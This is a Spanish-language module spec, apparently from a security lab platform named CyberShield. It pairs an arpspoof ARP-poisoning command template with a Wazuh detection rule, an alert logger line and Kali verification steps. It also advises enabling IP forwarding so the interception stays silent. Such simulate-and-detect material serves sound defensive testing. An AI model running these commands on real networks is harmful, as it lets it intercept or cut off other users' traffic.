# MOD05 — ARP Spoofing (Man-in-the-Middle)
ID: LAN-005 | MITRE: T1557 | Wazuh Rule: 100504 | Risk: CRITICAL

## Comando (INMUTABLE)
sudo arpspoof -i {{interface}} -t {{target}} {{gateway}}

## Parámetros
| name      | type | default | required |
|-----------|------|---------|----------|
| interface | text | eth0    | true     |
| target    | text | ""      | true     |
| gateway   | text | ""      | true     |

## Logger (INMUTABLE)
logger -t CyberShield -p local0.alert "SEC_VIOLATION: ARP Spoofing MitM detected targeting {{target}} - MITRE:T1557"

## Regla Wazuh (INMUTABLE)
<rule id="100504" level="12">
  <if_sid>1002</if_sid>
  <match>SEC_VIOLATION: ARP Spoofing</match>
  <description>ALERTA CYBERSHIELD: Envenenamiento de caché ARP (Man-in-the-Middle) detectado</description>
  <mitre><id>T1557</id></mitre>
</rule>

## Nota crítica
Sin IP Forwarding activo actúa como DoS en vez de MitM silencioso.
Activar antes: echo 1 > /proc/sys/net/ipv4/ip_forward

## Verificación en Kali (ejecutar en paralelo al ataque)
### MOD05a — ARP Injection
```bash
arp -n | grep -v "incomplete"
```
### MOD05b — ARP MitM
```bash
cat /proc/sys/net/ipv4/ip_forward
sudo arpwatch -i eth0 2>&1 | tail -5
```